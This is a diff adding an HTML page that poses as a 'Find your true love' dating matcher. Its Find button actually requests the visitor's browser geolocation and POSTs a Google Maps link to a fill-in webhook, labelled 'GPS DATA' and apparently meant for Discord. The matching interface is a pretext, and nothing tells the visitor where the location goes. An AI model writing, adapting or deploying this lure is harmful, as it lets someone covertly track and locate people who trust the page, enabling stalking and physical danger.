@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Find your true love</title>
+<style>
+body {
+	background-color: white;
+	font-family: Arial, sans-serif;
+	font-size: 16px;
+	line-height: 1.5em;
+	margin: 0;
+	padding: 0;
+	}
+
+		h1 {
+			color: #333;
+			font-size: 36px;
+			margin-top: 50px;
+			text-align: center;
+			}
+		
+		p {
+			color: #666;
+			font-size: 24px;
+			margin: 20px 0;
+			text-align: center;
+			}
+		
+		input[type=radio] {
+			display: none;
+			}
+		
+		label {
+			cursor: pointer;
+			display: inline-block;
+			margin: 10px;
+			padding: 10px 20px;
+			background-color: #ddd;
+			border-radius: 5px;
+			}
+		
+		input[type=radio]:checked + label {
+			background-color: #f21483;
+			color: white;
+			}
+		
+		input[type=text] {
+			width: 50%;
+			padding: 12px 20px;
+			margin: 8px 0;
+			display: inline-block;
+			border: 1px solid #ccc;
+			border-radius: 4px;
+			box-sizing: border-box;
+			}
+		
+		button {
+			background-color: #555eff;
+			border: none;
+			color: white;
+			font-size: 24px;
+			margin: 20px 0;
+			padding: 10px 20px;
+			text-align: center;
+			text-decoration: none;
+			display: inline-block;
+			cursor: pointer;
+			border-radius: 5px;
+			}
+		
+		button:hover {
+			background-color: #f21483;
+			}
+		
+		.center {
+			text-align: center;
+			}
+		</style>
+		</head>
+		<body>
+		<h1>FIND YOUR TRUE LOVE</h1>
+		<p>Gender:</p>
+		<div class="center">
+		<input type="radio" id="male" name="gender" value="male">
+		<label for="male">Male</label>
+		
+		<input type="radio" id="female" name="gender" value="female">
+		<label for="female">Female</label>
+		</div>
+		
+		<p>Looking for:</p>
+		<div class="center">
+		<input type="radio" id="looking-male" name="looking-for" value="male">
+		<label for="looking-male">Male</label>
+		
+		<input type="radio" id="looking-female" name="looking-for" value="female">
+		<label for="looking-female">Female</label>
+		</div>
+		
+		<div class="center">
+		<p>Click the button below to find your true love:</p>
+		<button onclick="getLocation()">Find</button>
+		</div>
+		
+		<script>
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(sendLocation);
+				} else {
+					alert("Geolocation is not supported by this browser.");
+					}
+				}
+				
+				function sendLocation(position) {
+					var request = new XMLHttpRequest();
+					request.open("POST", "your webhook link here");
+					
+					request.setRequestHeader('Content-type', 'application/json');
+					
+					var latitude = position.coords.latitude;
+					var longitude = position.coords.longitude;
+					
+					var params = {
+						username: "GPS DATA",
+						avatar_url: "https://cdn.discordapp.com/attachments/1006923826698919996/1084376639628132402/love.png",
+						content: "https://www.google.com/maps/place/" + latitude + "," + longitude
+						}
+					
+					request.send(JSON.stringify(params));
+					}
+					</script>
+					</body>
+					</html>
